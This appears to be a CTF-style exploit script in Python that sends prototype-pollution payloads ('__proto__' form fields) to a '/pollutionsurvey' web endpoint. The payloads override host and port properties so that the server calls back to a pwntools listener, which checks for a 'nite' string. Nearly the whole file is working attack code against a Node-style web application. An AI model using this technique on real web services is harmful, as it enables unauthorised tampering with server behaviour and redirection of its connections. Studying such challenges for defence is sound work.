import requests
from pwn import *

# if len(sys.argv) != 4:
#     print("Usage: python script.py <listening host> <listening port> <tagert url>")

# host = sys.argv[1]
# port = sys.argv[2]
# url = sys.argv[3]

host = "localhost"
port = 1339
url = "http://localhost:1337/pollutionsurvey"


def listener():
    print(f"[*] Starting listener at {port}")
    l = listen(port)
    sock = l.wait_for_connection()
    data = sock.recv().decode().strip()

    if "nite" in data:
        print("\nall ok\n")

    sock.close()


def attack():
    print(f"[*] Attacking {url}")

    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"name": "__proto__", "city": "host", "pollutionRate": host}
    requests.post(url, headers=headers, data=data)

    data = {"name": "__proto__", "city": "port", "pollutionRate": port}
    requests.post(url, headers=headers, data=data)


if __name__ == "__main__":
    listen_thread = threading.Thread(target=listener)
    listen_thread.start()
    time.sleep(1)
    attack()
    listen_thread.join()
